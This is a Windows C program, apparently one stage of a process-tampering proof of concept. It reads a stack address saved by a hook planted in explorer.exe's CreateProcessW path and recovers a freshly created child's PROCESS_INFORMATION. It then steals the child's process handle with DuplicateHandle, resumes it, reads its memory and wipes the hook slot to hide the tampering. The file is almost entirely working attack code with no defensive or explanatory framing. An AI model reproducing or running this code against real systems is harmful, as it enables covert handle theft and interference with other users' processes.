#include <Windows.h>
#include <Psapi.h>
#include <winternl.h>

#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtResumeProcess(_In_ HANDLE hProcess);

// Source dependency: the kernel32!CreateProcessW wrapper stores the caller's
// lpProcessInformation at [entry_rsp-0x10]; at the hook site (after SUB rsp,58h
// and the internal CALL returns) that location is [RSP+0x48].
#define STACK_PI_OFFSET 0x48

static BOOL ReadRemote(
    _In_ HANDLE hProcess,
    _In_ UINT_PTR qwAddress,
    _Out_writes_bytes_(cbSize) LPVOID lpBuffer,
    _In_ SIZE_T cbSize
) {
    SIZE_T cbRead = 0;
    if (!ReadProcessMemory(hProcess, (LPCVOID) qwAddress, lpBuffer, cbSize, &cbRead) || cbRead != cbSize) {
        fprintf(stderr, "[-] ReadProcessMemory at 0x%llX: E%lu\n", (unsigned long long) qwAddress, GetLastError());
        return FALSE;
    }
    return TRUE;
}

int main(int argc, const char* argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <EXPLORER_PID> <RSP_SLOT_ADDRESS_HEX>\n", argv[0]);
        return EXIT_FAILURE;
    }

    DWORD dwPid = (DWORD) strtoul(argv[1], NULL, 10);
    UINT_PTR qwSlot = (UINT_PTR) strtoull(argv[2], NULL, 16);
    if (0 == dwPid || 0 == qwSlot) {
        fprintf(stderr, "[-] Invalid PID or slot address\n");
        return EXIT_FAILURE;
    }

    INT iRet = EXIT_FAILURE;
    HANDLE hExplorer = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_DUP_HANDLE,
        FALSE,
        dwPid
    );
    if (NULL == hExplorer) {
        fprintf(stderr, "[-] OpenProcess(%lu): E%lu\n", dwPid, GetLastError());
        return EXIT_FAILURE;
    }

    HANDLE hDup = NULL;
    UINT_PTR qwRsp = 0;
    UINT_PTR qwPiPtr = 0;
    PROCESS_INFORMATION pi = { 0 };

    if (!ReadRemote(hExplorer, qwSlot, &qwRsp, sizeof(qwRsp))) {
        goto _FINAL;
    }
    if (0 == qwRsp || 0xCCCCCCCCCCCCCCCCULL == qwRsp) {
        fprintf(stderr, "[-] RSP slot is empty or still INT3 padding; the hook has not fired\n");
        goto _FINAL;
    }

    if (!ReadRemote(hExplorer, qwRsp + STACK_PI_OFFSET, &qwPiPtr, sizeof(qwPiPtr))) {
        goto _FINAL;
    }
    if (0 == qwPiPtr) {
        fprintf(stderr, "[-] Stack slot [RSP+0x48] is null; no PROCESS_INFORMATION pointer\n");
        goto _FINAL;
    }

    if (!ReadRemote(hExplorer, qwPiPtr, &pi, sizeof(pi))) {
        goto _FINAL;
    }

    printf(
        "[+] RSP slot................................. 0x%llX\n"
        "[+] Captured RSP............................. 0x%llX\n"
        "[+] PROCESS_INFORMATION pointer.............. 0x%llX (at RSP+0x48)\n"
        "[+] PROCESS_INFORMATION address.............. 0x%llX\n"
        "[+] hProcess / hThread....................... 0x%llX / 0x%llX\n"
        "[+] dwProcessId / dwThreadId................. %lu / %lu\n",
        (unsigned long long) qwSlot,
        (unsigned long long) qwRsp,
        (unsigned long long) (qwRsp + STACK_PI_OFFSET),
        (unsigned long long) qwPiPtr,
        (unsigned long long) pi.hProcess,
        (unsigned long long) pi.hThread,
        pi.dwProcessId,
        pi.dwThreadId
    );

    if (0 == pi.dwProcessId || NULL == pi.hProcess) {
        fprintf(stderr, "[-] Recovered PROCESS_INFORMATION is not plausible\n");
        goto _FINAL;
    }

    if (!DuplicateHandle(
        hExplorer,
        pi.hProcess,
        GetCurrentProcess(),
        &hDup,
        PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ | PROCESS_SUSPEND_RESUME,
        FALSE,
        0
    )) {
        fprintf(stderr, "[-] DuplicateHandle: E%lu\n", GetLastError());
        goto _FINAL;
    }

    DWORD dwDupPid = GetProcessId(hDup);
    if (dwDupPid != pi.dwProcessId) {
        fprintf(
            stderr,
            "[-] Duplicated handle points at PID %lu, expected %lu\n",
            dwDupPid,
            pi.dwProcessId
        );
        goto _FINAL;
    }
    printf("[+] Duplicated handle validated: PID %lu matches the recovered structure\n", dwDupPid);

    NTSTATUS ntStatus = NtResumeProcess(hDup);
    printf("[+] NtResumeProcess(child): 0x%08lX\n", (unsigned long) ntStatus);

    HMODULE hChildModule = NULL;
    DWORD cbNeeded = 0;
    if (!K32EnumProcessModules(hDup, &hChildModule, sizeof(hChildModule), &cbNeeded) || 0 == cbNeeded) {
        fprintf(stderr, "[-] K32EnumProcessModules(child): E%lu\n", GetLastError());
        goto _FINAL;
    }

    BYTE abHeader[2] = { 0 };
    if (!ReadRemote(hDup, (UINT_PTR) hChildModule, abHeader, sizeof(abHeader))) {
        goto _FINAL;
    }
    if ('M' != abHeader[0] || 'Z' != abHeader[1]) {
        fprintf(stderr, "[-] Child image base does not start with MZ\n");
        goto _FINAL;
    }
    printf(
        "[+] Read proof: 2 bytes at child image base 0x%llX = %02X %02X (MZ)\n",
        (unsigned long long) hChildModule,
        abHeader[0],
        abHeader[1]
    );

    CONST BYTE abZero[8] = { 0 };
    SIZE_T cbWritten = 0;
    if (!WriteProcessMemory(hExplorer, (LPVOID) qwSlot, abZero, sizeof(abZero), &cbWritten) || cbWritten != sizeof(abZero)) {
        fprintf(stderr, "[-] RSP slot cleanup write: E%lu\n", GetLastError());
        goto _FINAL;
    }
    UINT_PTR qwCleared = 0;
    if (!ReadRemote(hExplorer, qwSlot, &qwCleared, sizeof(qwCleared)) || 0 != qwCleared) {
        fprintf(stderr, "[-] RSP slot cleanup verification failed\n");
        goto _FINAL;
    }
    printf("[+] RSP slot cleared and verified\n");

    iRet = EXIT_SUCCESS;

_FINAL:
    if (NULL != hDup) {
        CloseHandle(hDup);
    }
    CloseHandle(hExplorer);
    return iRet;
}